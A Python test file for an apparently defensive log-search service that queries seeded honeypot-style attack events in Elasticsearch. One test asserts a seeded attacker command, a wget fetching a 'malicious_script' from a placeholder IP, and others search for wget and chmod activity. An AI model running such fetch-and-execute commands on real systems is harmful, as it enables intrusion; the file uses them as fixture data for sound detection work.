import pytest

from app.es.queries import build_log_query, get_event_by_id, search_logs
from app.models.event import LogQuery
from app.seed.seeder import seed


def test_empty_query_matches_everything() -> None:
    assert build_log_query(LogQuery()) == {"bool": {"filter": [], "must": []}}


def test_source_ip_becomes_a_term_filter() -> None:
    dsl = build_log_query(LogQuery(source_ip="185.220.101.44"))
    assert {"term": {"source.ip": "185.220.101.44"}} in dsl["bool"]["filter"]


def test_free_text_searches_command_line_action_user_and_source_ip() -> None:
    dsl = build_log_query(LogQuery(q="wget"))
    assert dsl["bool"]["must"] == [
        {
            "multi_match": {
                "query": "wget",
                "fields": [
                    "process.command_line",
                    "event.action",
                    "user.name",
                    "source.ip",
                ],
                "lenient": True,
            }
        }
    ]


@pytest.mark.asyncio
async def test_free_text_search_matches_a_bare_attacker_ip() -> None:
    """Pasting an attacker IP into the log search must find its events.

    Without `source.ip` in the multi_match this returned zero hits while the
    equivalent search on the sessions surface worked, which is a silently
    inconsistent result for the same query text.
    """
    await seed(reset=True)
    page = await search_logs(LogQuery(q="185.220.101.44"))

    assert page.total > 0
    assert all(e.source.ip == "185.220.101.44" for e in page.items)


@pytest.mark.asyncio
async def test_free_text_search_still_matches_commands_after_adding_source_ip() -> None:
    """A non-IP query must not be rejected by the `ip`-mapped field."""
    await seed(reset=True)
    page = await search_logs(LogQuery(q="chmod"))

    commands = [
        e.process.command_line for e in page.items if e.process and e.process.command_line
    ]
    assert any("chmod" in c for c in commands)


def test_time_range_becomes_a_range_filter() -> None:
    dsl = build_log_query(
        LogQuery(from_="2026-08-20T00:00:00Z", to="2026-08-21T00:00:00Z")
    )
    assert {
        "range": {
            "@timestamp": {"gte": "2026-08-20T00:00:00Z", "lte": "2026-08-21T00:00:00Z"}
        }
    } in dsl["bool"]["filter"]


@pytest.mark.asyncio
async def test_search_logs_paginates() -> None:
    await seed(reset=True)
    page = await search_logs(LogQuery(session_id="seed-botnet-01", page_size=5))

    assert page.page_size == 5
    assert len(page.items) == 5
    assert page.total > 5
    assert all(e.session.id == "seed-botnet-01" for e in page.items)


@pytest.mark.asyncio
async def test_unanalyzed_event_reports_informational_risk() -> None:
    await seed(reset=True)
    page = await search_logs(LogQuery(session_id="seed-recon-01", page_size=1))
    event = page.items[0]

    assert event.risk.level == "informational"
    assert event.risk.score == 0


@pytest.mark.asyncio
async def test_get_event_by_id_resolves_a_known_seed_document() -> None:
    await seed(reset=True)
    event = await get_event_by_id("seed-botnet-01-008")

    assert event is not None
    assert event.process is not None
    assert event.process.command_line == "wget http://198.51.100.7/malicious_script"


@pytest.mark.asyncio
async def test_get_event_by_id_returns_none_for_unknown_id() -> None:
    assert await get_event_by_id("does-not-exist") is None
